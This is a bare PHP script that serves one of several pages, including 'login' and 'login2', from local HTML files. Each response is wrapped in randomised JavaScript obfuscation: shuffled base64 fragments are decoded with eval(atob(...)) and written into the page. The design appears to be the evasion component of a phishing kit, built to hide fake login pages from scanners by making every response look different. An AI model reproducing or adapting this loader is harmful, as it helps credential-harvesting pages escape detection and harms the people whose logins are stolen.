<?php


displayPageContents();
function displayPageContents(){
  ob_start();
  $dateCurrent = date("Y/m/d");
  $dateCurrentMdFive = md5($dateCurrent);
  //if(!is_dir($dateCurrentMdFive)){ mkdir($dateCurrentMdFive); }
  if(isset($_GET['page']) && $_GET['page'] != ''){
    $pageName = $_GET['page'];
    if($pageName == 'login'){
	  echo obufsicateHtmlV2(file_get_contents($pageName.'.html'));
	}
	else if($pageName == 'login2'){
	  echo obufsicateHtmlV2(file_get_contents($pageName.'.html'));
	}
	else{
	  echo obufsicateHtmlV2(file_get_contents('index.html'));	
	}
  }
  else{
	  echo obufsicateHtmlV2(file_get_contents('index.html'));	
	}
  $thePageOutput = ob_get_clean();
  echo $thePageOutput;
  //echo $dateCurrent;	
}
function obufsicateHtmlV2($htmldata){
  $alpha = str_shuffle(join(range('a','z')));
  $alpha .= $alpha;$alpha .= $alpha;
  $alphaLen = strlen($alpha)-1;
  $alpha1 = substr(str_shuffle($alpha), 0, mt_rand(10, 25));
  $alpha1x = str_shuffle(strtoupper($alpha).$alpha);

  $htmldata = base64_encode($htmldata);
  //echo strlen($htmldata).'<br>';
  //echo $htmldata." <br><br>\n";
  $spliter = mt_rand(20, 50);
  $htmldata = str_split($htmldata, $spliter);
  $varOne = $alpha[mt_rand(0, $alphaLen)];
  $varTwo = $alpha[mt_rand(0, $alphaLen)].$alpha[mt_rand(0, $alphaLen)];
  $varThree = $alpha[mt_rand(0, $alphaLen)].$alpha[mt_rand(0, $alphaLen)];
  $varFOur = $alpha[mt_rand(0, $alphaLen)].$alpha[mt_rand(0, $alphaLen)];
  $outxx = array();
  $ana = '';
  foreach ($htmldata as $key=>$value) {
    $outxx[] = $varOne."[$key]=".'"'.$value.'";';  
  }
  shuffle($outxx);
  $htmldataCount = count($outxx);
  $outx = 'var '.$varTwo."='',";
  $outx .= $varOne.'=Array('.$htmldataCount.');';
  $outxx = join($outxx);
  
  $outx .= $outxx;
  $outx .= $varTwo.' = document.open("text/html", "replace"); 
   '.$varTwo.'.write(atob('.$varOne.'.join(""))); 
   '.$varTwo.'.close();';
  $addit = substr($alpha1x, 0, mt_rand(15, 50));
  $additLen = strlen($addit);
  $outx = $addit.base64_encode($outx);
  
  //  print_r($outxx);
  $out = '<!DOCTYPE html>'."\n".'<html><head>
<meta charset="UTF-8">
</head><body>
<script>
eval(atob("'.$outx.'".substr('.$additLen.')));
</script>
</body>
</html>
';
$out = str_replace("\n", '', $out);
//echo "<br>: ".strlen($out);
return $out;
}






?>